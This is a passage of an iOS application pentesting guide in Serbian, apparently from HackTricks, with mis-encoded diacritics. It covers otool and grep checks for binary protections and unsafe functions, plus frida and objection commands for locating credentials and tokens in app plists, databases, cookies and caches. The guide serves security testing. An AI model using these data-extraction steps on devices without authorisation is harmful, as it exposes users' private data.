# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Pogledajte [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnove iOS-a

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Testno OkruÅ¾enje

Na ovoj stranici moÅ¾ete pronaÄ‡i informacije o **iOS simulatoru**, **emulatorima** i **jailbreaking-u:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## PoÄetna Analiza

### Osnovne iOS Testne Operacije

Tokom testiranja Ä‡e biti predloÅ¾ene **razliÄite operacije** (povezivanje sa ureÄ‘ajem, Äitanje/pisanje/otpÅ¡iljanje/preuzimanje fajlova, koriÅ¡Ä‡enje nekih alata...). Stoga, ako ne znate kako da izvrÅ¡ite bilo koju od ovih akcija, molimo vas da **poÄnete sa Äitanjem stranice**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Za sledeÄ‡e korake **aplikacija treba da bude instalirana** na ureÄ‘aju i veÄ‡ treba da ste dobili **IPA fajl** aplikacije.\
ProÄitajte stranicu [Osnovne iOS Testne Operacije](basic-ios-testing-operations.md) da biste saznali kako to uraditi.
{% endhint %}

### Osnovna StatistiÄka Analiza

PreporuÄuje se koriÅ¡Ä‡enje alata [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) za automatsku StatistiÄku Analizu IPA fajla.

Identifikacija **zaÅ¡tita koje su prisutne u binarnom fajlu**:

*   **PIE (Position Independent Executable)**: Kada je omoguÄ‡eno, aplikacija se uÄitava na nasumiÄnu memorijsku adresu svaki put kada se pokrene, Äime se oteÅ¾ava predviÄ‘anje njene poÄetne memorijske adrese.

```bash
otool -hv <app-binary> | grep PIE   # Trebalo bi da ukljuÄuje PIE zastavicu
```
*   **Stack Canaries**: Da bi se validirala celovitost steka, 'canary' vrednost se postavlja na stek pre poziva funkcije i ponovo se validira kada funkcija zavrÅ¡i.

```bash
otool -I -v <app-binary> | grep stack_chk   # Trebalo bi da ukljuÄuje simbole: stack_chk_guard i stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Da bi se spreÄile uobiÄajene greÅ¡ke u korupciji memorije

```bash
otool -I -v <app-binary> | grep objc_release   # Trebalo bi da ukljuÄuje simbol _objc_release
```
*   **Enkriptovan Binarni Fajl**: Binarni fajl treba da bude enkriptovan

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid treba da bude 1
```

**Identifikacija Osetljivih/Nesigurnih Funkcija**

*   **Slabi Hashing Algoritmi**

```bash
# Na iOS ureÄ‘aju
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Na linux-u
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Nesigurne Random Funkcije**

```bash
# Na iOS ureÄ‘aju
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Na linux-u
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Nesigurna 'Malloc' Funkcija**

```bash
# Na iOS ureÄ‘aju
otool -Iv <app> | grep -w "_malloc"

# Na linux-u
grep -iER "_malloc"
```
*   **Nesigurne i Ranjive Funkcije**

```bash
# Na iOS ureÄ‘aju
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Na linux-u
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Osnovna DinamiÄka Analiza

Pogledajte dinamiÄku analizu koju izvrÅ¡ava [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Morate da pretraÅ¾ujete razliÄite prikaze i interagujete sa njima, ali Ä‡e povezivati nekoliko klasa i obavljati druge radnje, a izradiÄ‡e izveÅ¡taj kada zavrÅ¡ite.

### Lista Instaliranih Aplikacija

Koristite komandu `frida-ps -Uai` da biste odredili **identifikator paketa** instaliranih aplikacija:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Osnovna enumeracija i hakovanje

Saznajte kako **enumerisati komponente aplikacije** i kako lako **hakovati metode i klase** pomoÄ‡u objekcije:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Struktura IPA fajla

Struktura **IPA fajla** je suÅ¡tinski struktura **zipovanog paketa**. Preimenovanjem ekstenzije u `.zip`, moÅ¾e se **dekompresovati** kako bi se otkrili njegovi sadrÅ¾aji. Unutar ove strukture, **Bundle** predstavlja potpuno zapakovanu aplikaciju spremnu za instalaciju. Unutar, pronaÄ‡i Ä‡ete direktorijum nazvan `<IME>.app`, koji enkapsulira resurse aplikacije.

* **`Info.plist`**: Ovaj fajl sadrÅ¾i specifiÄne konfiguracione detalje aplikacije.
* **`_CodeSignature/`**: Ovaj direktorijum ukljuÄuje plist fajl koji sadrÅ¾i potpis, osiguravajuÄ‡i integritet svih fajlova u paketu.
* **`Assets.car`**: Kompresovani arhiv koji Äuva fajlove resursa poput ikona.
* **`Frameworks/`**: Ovaj folder sadrÅ¾i native biblioteke aplikacije, koje mogu biti u obliku `.dylib` ili `.framework` fajlova.
* **`PlugIns/`**: Ovde se mogu nalaziti proÅ¡irenja aplikacije, poznata kao `.appex` fajlovi, iako nisu uvek prisutni.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Koristi se za Äuvanje trajnih podataka vaÅ¡e aplikacije za offline koriÅ¡Ä‡enje, keÅ¡iranje privremenih podataka i dodavanje funkcionalnosti poniÅ¡tavanja u vaÅ¡u aplikaciju na jednom ureÄ‘aju. Da biste sinhronizovali podatke na viÅ¡e ureÄ‘aja u jednom iCloud nalogu, Core Data automatski preslikava vaÅ¡u Å¡emu u CloudKit kontejner.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Fajl `PkgInfo` je alternativni naÄin za specificiranje tipa i kreator koda vaÅ¡e aplikacije ili paketa.
* **en.lproj, fr.proj, Base.lproj**: Su jeziÄki paketi koji sadrÅ¾e resurse za te specifiÄne jezike, i podrazumevani resurs u sluÄaju da jezik nije podrÅ¾an.
* **Bezbednost**: Direktorijum `_CodeSignature/` igra kljuÄnu ulogu u bezbednosti aplikacije verifikujuÄ‡i integritet svih zapakovanih fajlova putem digitalnih potpisa.
* **Upravljanje resursima**: Fajl `Assets.car` koristi kompresiju za efikasno upravljanje grafiÄkim resursima, Å¡to je kljuÄno za optimizaciju performansi aplikacije i smanjenje njenog ukupnog obima.
* **Frameworks i PlugIns**: Ovi direktorijumi istiÄu modularnost iOS aplikacija, omoguÄ‡avajuÄ‡i programerima da ukljuÄe biblioteke sa ponovno iskoristivim kodom (`Frameworks/`) i proÅ¡ire funkcionalnost aplikacije (`PlugIns/`).
* **Lokalizacija**: Struktura podrÅ¾ava viÅ¡e jezika, olakÅ¡avajuÄ‡i globalni doseg aplikacije ukljuÄivanjem resursa za specifiÄne jeziÄke pakete.

**Info.plist**

**Info.plist** sluÅ¾i kao osnova za iOS aplikacije, enkapsuliÅ¡uÄ‡i kljuÄne konfiguracione podatke u obliku **kljuÄ-vrednost** parova. Ovaj fajl je obavezan ne samo za aplikacije veÄ‡ i za aplikaciona proÅ¡irenja i okvire koji su zapakovani unutar. Strukturiran je u XML ili binarnom formatu i sadrÅ¾i kljuÄne informacije koje se kreÄ‡u od dozvola aplikacije do sigurnosnih konfiguracija. Za detaljno istraÅ¾ivanje dostupnih kljuÄeva, moÅ¾ete se obratiti [**Apple Developer dokumentaciji**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Za one koji Å¾ele da rade sa ovim fajlom u pristupaÄnijem formatu, konverzija u XML format moÅ¾e se postiÄ‡i lako koriÅ¡Ä‡enjem `plutil` na macOS-u (dostupno nativno na verzijama 10.2 i kasnije) ili `plistutil` na Linux-u. Komande za konverziju su sledeÄ‡e:

* **Za macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Za Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
MeÄ‘u mnoÅ¡tvom informacija koje **Info.plist** datoteka moÅ¾e otkriti, znaÄajni unosi ukljuÄuju niske dozvola aplikacije (`UsageDescription`), prilagoÄ‘ene URL Å¡eme (`CFBundleURLTypes`), i konfiguracije za bezbednost transporta aplikacije (`NSAppTransportSecurity`). Ovi unosi, zajedno sa drugima poput izvezenih/uvezenih prilagoÄ‘enih tipova dokumenata (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), mogu se lako pronaÄ‡i inspekcijom datoteke ili koriÅ¡Ä‡enjem jednostavne `grep` komande:
```bash
$ grep -i <keyword> Info.plist
```
**Putanje podataka**

U iOS okruÅ¾enju, direktorijumi su posebno odreÄ‘eni za **sistemsku aplikaciju** i **aplikacije koje je instalirao korisnik**. Sistemski aplikacije se nalaze u direktorijumu `/Applications`, dok se aplikacije koje je instalirao korisnik smeÅ¡taju u `/var/mobile/containers/Data/Application/`. Ove aplikacije su dodeljene jedinstveni identifikator poznat kao **128-bitni UUID**, Å¡to Äini zadatak ruÄnog lociranja foldera aplikacije izazovnim zbog nasumiÄnosti imena direktorijuma.

{% hint style="warning" %}
PoÅ¡to aplikacije u iOS-u moraju biti u pesku, svaka aplikacija Ä‡e takoÄ‘e imati folder unutar **`$HOME/Library/Containers`** sa **`CFBundleIdentifier`** aplikacije kao imenom foldera.

MeÄ‘utim, oba foldera (data & container folderi) sadrÅ¾e fajl **`.com.apple.mobile_container_manager.metadata.plist`** koji povezuje oba fajla u kljuÄu `MCMetadataIdentifier`).
{% endhint %}

Da bi olakÅ¡ao otkrivanje direktorijuma instalacije aplikacije koju je instalirao korisnik, **objection alat** pruÅ¾a korisnu komandu, `env`. Ova komanda otkriva detaljne informacije o direktorijumu za datu aplikaciju. U nastavku je primer kako koristiti ovu komandu:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternativno, ime aplikacije moÅ¾e biti pretraÅ¾eno unutar `/private/var/containers` koriÅ¡Ä‡enjem `find` komande:
```bash
find /private/var/containers -name "Progname*"
```
Komande poput `ps` i `lsof` takoÄ‘e mogu biti iskoriÅ¡Ä‡ene za identifikaciju procesa aplikacije i listanje otvorenih fajlova, redom, pruÅ¾ajuÄ‡i uvid u aktivne putanje direktorijuma aplikacije:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Direktorijum paketa:**

* **AppName.app**
* Ovo je aplikacioni paket koji je viÄ‘en ranije u IPA datoteci, sadrÅ¾i osnovne podatke aplikacije, statiÄki sadrÅ¾aj kao i kompilirani binarni fajl aplikacije.
* Ovaj direktorijum je vidljiv korisnicima, ali **korisnici ne mogu pisati u njega**.
* SadrÅ¾aj u ovom direktorijumu **nije rezervisan**.
* SadrÅ¾aj ovog foldera se koristi za **validaciju potpisa koda**.

**Direktorijum podataka:**

* **Documents/**
* SadrÅ¾i sve podatke koje je generisao korisnik. Korisnik aplikacije pokreÄ‡e kreiranje ovih podataka.
* Vidljiv korisnicima i **korisnici mogu pisati u njega**.
* SadrÅ¾aj u ovom direktorijumu je **rezervisan**.
* Aplikacija moÅ¾e onemoguÄ‡iti putanje postavljanjem `NSURLIsExcludedFromBackupKey`.
* **Library/**
* SadrÅ¾i sve **fajlove koji nisu specifiÄni za korisnika**, kao Å¡to su **keÅ¡evi**, **postavke**, **kolaÄiÄ‡i** i konfiguracioni fajlovi liste svojstava (plist).
* iOS aplikacije obiÄno koriste poddirektorijume `Application Support` i `Caches`, ali aplikacija moÅ¾e kreirati prilagoÄ‘ene poddirektorijume.
* **Library/Caches/**
* SadrÅ¾i **polu-persistentne keÅ¡irane fajlove**.
* Nevidljiv korisnicima i **korisnici ne mogu pisati u njega**.
* SadrÅ¾aj u ovom direktorijumu **nije rezervisan**.
* OS moÅ¾e automatski obrisati fajlove iz ovog direktorijuma kada aplikacija nije pokrenuta i kada je malo slobodnog prostora za skladiÅ¡tenje.
* **Library/Application Support/**
* SadrÅ¾i **persistentne fajlove** neophodne za pokretanje aplikacije.
* **Nevidljiv** **korisnicima** i korisnici ne mogu pisati u njega.
* SadrÅ¾aj u ovom direktorijumu je **rezervisan**.
* Aplikacija moÅ¾e onemoguÄ‡iti putanje postavljanjem `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Koristi se za Äuvanje svojstava koja mogu **persistirati Äak i nakon restartovanja aplikacije**.
* Informacije se Äuvaju, neÅ¡ifrovane, unutar aplikacionog sandboxa u plist fajlu nazvanom \[BUNDLE\_ID].plist.
* Svi parovi kljuÄ/vrednost saÄuvani koriÅ¡Ä‡enjem `NSUserDefaults` mogu se pronaÄ‡i u ovom fajlu.
* **tmp/**
* Koristite ovaj direktorijum za pisanje **privremenih fajlova** koji ne moraju persistirati izmeÄ‘u pokretanja aplikacije.
* SadrÅ¾i ne-persistentne keÅ¡irane fajlove.
* **Nevidljiv** korisnicima.
* SadrÅ¾aj u ovom direktorijumu nije rezervisan.
* OS moÅ¾e automatski obrisati fajlove iz ovog direktorijuma kada aplikacija nije pokrenuta i kada je malo slobodnog prostora za skladiÅ¡tenje.

Pogledajmo detaljnije Application Bundle (.app) direktorijum iGoat-Swift aplikacije unutar Bundle direktorijuma (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binarno Revertovanje

Unutar foldera `<ime-aplikacije>.app` pronaÄ‡i Ä‡ete binarni fajl koji se zove `<ime-aplikacije>`. Ovo je fajl koji Ä‡e biti **izvrÅ¡en**. MoÅ¾ete izvrÅ¡iti osnovnu inspekciju binarnog fajla pomoÄ‡u alata **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Proverite da li je aplikacija enkriptovana**

Vidite da li postoji bilo kakav izlaz za:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Rastavljanje binarnog koda**

Rastavite tekstualni odeljak:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Da biste odÅ¡tampali **Objective-C segment** uzorka aplikacije, moÅ¾ete koristiti:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Da biste dobili kompaktniji Objective-C kod, moÅ¾ete koristiti [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
MeÄ‘utim, najbolje opcije za rastavljanje binarnog koda su: [**Hopper**](https://www.hopperapp.com/download.html?) i [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## SkladiÅ¡tenje podataka

Da biste saznali kako iOS Äuva podatke na ureÄ‘aju, proÄitajte ovu stranicu:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
SledeÄ‡a mesta za Äuvanje informacija treba proveriti **odmah nakon instaliranja aplikacije**, **nakon provere svih funkcionalnosti** aplikacije, pa Äak i nakon **odjavljivanja sa jednog korisnika i prijavljivanja sa drugog**.\
Cilj je pronaÄ‡i **nezaÅ¡tiÄ‡ene osetljive informacije** aplikacije (Å¡ifre, tokene), trenutnog korisnika i prethodno prijavljenih korisnika.
{% endhint %}

### Plist

**plist** fajlovi su strukturirani XML fajlovi koji **sadrÅ¾e parove kljuÄ-vrednost**. To je naÄin za Äuvanje trajnih podataka, pa ponekad moÅ¾ete pronaÄ‡i **osetljive informacije u ovim fajlovima**. PreporuÄuje se provera ovih fajlova nakon instaliranja aplikacije i nakon intenzivnog koriÅ¡Ä‡enja kako biste videli da li su upisani novi podaci.

NajÄeÅ¡Ä‡i naÄin za Äuvanje podataka u plist fajlovima je kroz koriÅ¡Ä‡enje **NSUserDefaults**. Ovaj plist fajl se Äuva unutar aplikacije u pesku u **`Library/Preferences/<appBundleID>.plist`**

Klasa [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) pruÅ¾a programski interfejs za interakciju sa podrazumevanim sistemom. Podrazumevani sistem omoguÄ‡ava aplikaciji da prilagodi svoje ponaÅ¡anje prema **korisniÄkim preferencama**. Podaci saÄuvani pomoÄ‡u `NSUserDefaults` mogu se pregledati u aplikacionom paketu. Ova klasa Äuva **podatke** u **plist** **fajlu**, ali je namenjena za koriÅ¡Ä‡enje sa malim koliÄinama podataka.

Ovi podaci ne mogu direktno biti pristupljeni putem pouzdanog raÄunara, ali se mogu pristupiti prilikom izrade **rezervne kopije**.

MoÅ¾ete **izbaciti** informacije saÄuvane koriÅ¡Ä‡enjem **`NSUserDefaults`** koristeÄ‡i `ios nsuserdefaults get` u objection-u.

Da biste pronaÅ¡li sve plist fajlove koje koristi aplikacija, moÅ¾ete pristupiti `/private/var/mobile/Containers/Data/Application/{APPID}` i pokrenuti:
```bash
find ./ -name "*.plist"
```
Da biste konvertovali fajlove iz **XML ili binarnog (bplist)** formata u XML, dostupne su razliÄite metode u zavisnosti od vaÅ¡eg operativnog sistema:

**Za korisnike macOS-a:** Iskoristite `plutil` komandu. To je ugraÄ‘eni alat u macOS (verzija 10.2+), dizajniran za tu svrhu:
```bash
$ plutil -convert xml1 Info.plist
```
**Za korisnike Linux-a:** Prvo instalirajte `libplist-utils`, zatim koristite `plistutil` da biste konvertovali vaÅ¡ fajl:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Tokom Objection sesije:** Za analizu mobilnih aplikacija, odreÄ‘ena komanda vam omoguÄ‡ava da direktno konvertujete plist fajlove:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) je okvir za upravljanje modelnim slojem objekata u vaÅ¡oj aplikaciji. [Core Data moÅ¾e koristiti SQLite kao svoj trajni skladiÅ¡te](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ali sam okvir nije baza podataka. CoreData ne Å¡ifrira podatke podrazumevano. MeÄ‘utim, dodatni sloj Å¡ifrovanja moÅ¾e se dodati CoreData-u. Pogledajte [GitHub Repo](https://github.com/project-imas/encrypted-core-data) za viÅ¡e detalja.

Informacije o SQLite Core Data aplikacije moÅ¾ete pronaÄ‡i na putanji `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Ako moÅ¾ete otvoriti SQLite i pristupiti osetljivim informacijama, onda ste pronaÅ¡li greÅ¡ku u konfiguraciji.**

{% code title="Kod iz iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) je skladiÅ¡te kljuÄ/vrednost izgraÄ‘eno na vrhu SQLite-a.\
PoÅ¡to su Yap baze podataka sqlite baze podataka, moÅ¾ete ih pronaÄ‡i koristeÄ‡i namensku komandu iz prethodnog odeljka.

### Ostale SQLite baze podataka

ÄŒesto se deÅ¡ava da aplikacije kreiraju svoje sopstvene sqlite baze podataka. Mogu **skladiÅ¡titi** **osetljive** **podatke** na njima i ostaviti ih neÅ¡ifrovane. Stoga je uvek interesantno proveriti svaku bazu podataka unutar direktorijuma aplikacije. Zato idite u direktorijum aplikacije gde su podaci saÄuvani (`/private/var/mobile/Containers/Data/Application/{APPID}`).
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

Programeri mogu **skladiÅ¡titi i sinhronizovati podatke** unutar **NoSQL cloud-hosted baze podataka** putem Firebase Real-Time baza podataka. Podaci su smeÅ¡teni u JSON formatu i sinhronizuju se sa svim povezanim klijentima u realnom vremenu.

Kako proveriti da li su Firebase baze podataka netaÄno konfigurisane moÅ¾ete pronaÄ‡i ovde:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm baze podataka

[Realm Objective-C](https://realm.io/docs/objc/latest/) i [Realm Swift](https://realm.io/docs/swift/latest/) nude moÄ‡nu alternativu za skladiÅ¡tenje podataka, koju Apple ne pruÅ¾a. Podaci se podrazumevano **skladiÅ¡te neÅ¡ifrovano**, a Å¡ifrovanje je dostupno putem specifiÄne konfiguracije.

Baze podataka se nalaze na: `/private/var/mobile/Containers/Data/Application/{APPID}`. Za istraÅ¾ivanje ovih fajlova, mogu se koristiti komande poput:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Za pregledanje ovih baza podataka preporuÄuje se alat [**Realm Studio**](https://github.com/realm/realm-studio).

Za implementaciju enkripcije unutar Realm baze podataka, moÅ¾e se koristiti sledeÄ‡i kodni iseÄak:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Baze podataka Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) je opisan kao **lagani** i **ugraÄ‘eni** baziÄni sistem koji sledi **orijentisan prema dokumentima** (NoSQL) pristup. Dizajniran da bude prirodan za **iOS** i **macOS**, nudi moguÄ‡nost sinhronizacije podataka bez problema.

Da biste identifikovali potencijalne Couchbase baze podataka na ureÄ‘aju, treba da pregledate sledeÄ‡i direktorijum:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### KolaÄiÄ‡i

iOS Äuva kolaÄiÄ‡e aplikacija u **`Library/Cookies/cookies.binarycookies`** unutar svake fascikle aplikacije. MeÄ‘utim, programeri ponekad odluÄe da ih saÄuvaju u **keychain-u** jer se pomenuti **fajl sa kolaÄiÄ‡ima moÅ¾e pristupiti u rezervnim kopijama**.

Da biste pregledali fajl sa kolaÄiÄ‡ima, moÅ¾ete koristiti [**ovaj Python skript**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ili koristiti objection-ovu komandu **`ios cookies get`.**\
**TakoÄ‘e moÅ¾ete koristiti objection da** konvertujete ove fajlove u JSON format i pregledate podatke.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### KeÅ¡

Podrazumevano, NSURLSession Äuva podatke, kao Å¡to su **HTTP zahtevi i odgovori u Cache.db** bazi podataka. Ova baza moÅ¾e sadrÅ¾ati **osetljive podatke**, ako su tokeni, korisniÄka imena ili bilo koje druge osetljive informacije keÅ¡irane. Da biste pronaÅ¡li keÅ¡irane informacije, otvorite direktorijum podataka aplikacije (`/var/mobile/Containers/Data/Application/<UUID>`) i idite na `/Library/Caches/<Bundle Identifier>`. **WebKit keÅ¡ se takoÄ‘e Äuva u Cache.db** fajlu. **Objection** moÅ¾e otvoriti i interagovati sa bazom podataka komandom `sqlite connect Cache.db`, jer je to **obiÄna SQLite baza podataka**.

**PreporuÄuje se onemoguÄ‡avanje keÅ¡iranja ovih podataka**, jer moÅ¾e sadrÅ¾ati osetljive informacije u zahtevu ili odgovoru. U nastavku je prikazan spisak razliÄitih naÄina postizanja ovoga:

